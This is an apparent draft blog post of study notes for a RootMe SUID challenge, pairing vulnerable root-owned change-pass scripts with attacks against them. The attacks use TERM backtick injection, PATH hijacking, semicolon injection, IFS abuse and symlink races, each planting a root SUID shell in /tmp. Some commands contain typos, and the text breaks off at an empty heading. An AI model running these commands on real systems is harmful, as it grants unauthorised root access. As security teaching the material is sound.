+++
categories = ["Development", "Programming", "Hacking"]
date = "2015-11-20T18:50:35+01:00"
description = ""
draft = true
image = "/img/about-bg.jpg"
tags = ["programming", "rootme", "challenges", "hack", "crack"]
title = "RootMe Challenge: ELF32 System I"

+++

# ELF32 - System 1 - SUID scripts vulnerabilities

# Resources

## [Danger of SUID Shell Scripts](http://repository.root-me.org/Administration/Unix/EN%20-%20Dangers%20of%20SUID%20Shell%20Scripts.pdf)

## 1. Never use C-shell for SUID scipts

- Script:
```
$ ls change-pass
-rwsr-x---  1 root helpdesk 37 Feb 26 16:35 change-pass

$ cat change-pass
#!/bin/csh -b
set user = $1
passwd $user
```

- Hack:
```
$ env TERM='`cp /bin/sh /tmp/sh;chown root /tmp/sh;chmod 4755/tmp/sh`' change-pass
```

## 2. Always manually set the PATH and use absolute path names.

- Script:
```
$ cat change-pass
#!/bin/ksh
user=$1
passwd $user
```

- Hack:
```
$ export PATH='/tmp'
$ echo "cp /bin/sh /tmp/sh;chown root /tmp/sh;chmod 4755/tmp/sh" > /tmp/passwd
$ ./change-pass
```

## 3. Understand how the programs in your script work, escpecially how they handle arguments

- Script:
```
$ cat change-pass
#!/bin/ksh
PATH='/bin:/usr/bin'
user=$1
rm /tmp/.user
echo "$user" > /tmp/.user
isroot='/usr/bin/grep -c root /tmp/.user'
[ "$isroot" -gt 0 ] && echo "You Can't change root's password!" && exit
/usr/bin/passwd $user
```

- Hack:

If the user runs the program and doesn't specify an argument, the program will run the passwd command without any arguments. It default so to the current user, the problem is that in a root-owned SUID script, the current user is always root.

- Script:
```
$ cat change-pass
$!/bin/ksh
PATH='/bin:/usr/bin'
user=$1
[ -z $user ] && echo "Usage: change-pass username" && exit
rm /tmp/.user
echo "$user" > /tmp/.user
isroot='/usr/bin/grep -c root /tmp/.user'
[ "$isroot" -gt 0] && echo "You Can't change root's password!" && exit
/usr/bin/passwd $user
```

- Hack:

A hacker could write a program that will automatically watch for activity and replace the /tmp/.user file between the ```rm``` and ```echo``` by an empty one. It could not be overwritten and so run as root.

## 4. Don't use temporary files, don't put them in a publicity writable area

- Script:
```
$ cat change-pass
#!/bin/ksh
PATH='/bin:/usr/bin'
user=$1
[ -z $user ] && echo "Usage: change-pass username" && exit
[ "$user" = root ] && echo "You can't change root's password!" && exit
/usr/bin/passwd $user
```

- Hack (semi-colon trick):
```
$ change-pass "user;cp /bin/sh /tmp/sh;chown root /tmp/sh;chmod 4755 /tmp/sh"
```

## 5. Distrust and check all user input, and strip out any meta-characters

- Script:
```
$ cat change-pass
#!/bin/ksh
PATH='/bin:/usr/bin'
user=${1##*[ \\$/;()|\>\<&    ]}
[ -z $user ] && echo "Usage: change-pass username" && exit
[ "$user" = root ] && "You can't change root's password!" && exit
/usr/bin/passwd $user
```

- Hack (Internal Filed Separator (IFS) vulnerability):
```
$ export IFS='/'
```

## 6. Always manually set IFS

- Script:
```
$ cat change-pass
#!/bin/ksh
PATH='/bin:/usr/bin'
IFS=' '
user=${1##*[ \\$/;()|\>\<&    ]}
[ -z $user ] && echo "Usage: change-pass username" && exit
[ "$user" = root ] && "You can't change root's password!" && exit
/usr/bin/passwd $user
```

- Hack:
```
// Create a link to the SUID script:
$ cd /tmp
ln -s change-pass rootme

// Running the link, quickly replace it with another file:
$ ./rootmer &
& rm rootme && \
  echo "cp /bin/sh /tmp/sh;chown root /tmp/sh;chmod 4755 /tmp/sh" \
    >> rootme
```

## 7. Don't use SUID shell scripts

There are the more secure options (even more):
  - a wrapper program written in C
  - a Perl script
  - a program like sudo


## [SUID Privileged Programs](http://repository.root-me.org/Administration/Unix/EN%20-%20SUID%20Privileged%20Programs.pdf)

## 1. 
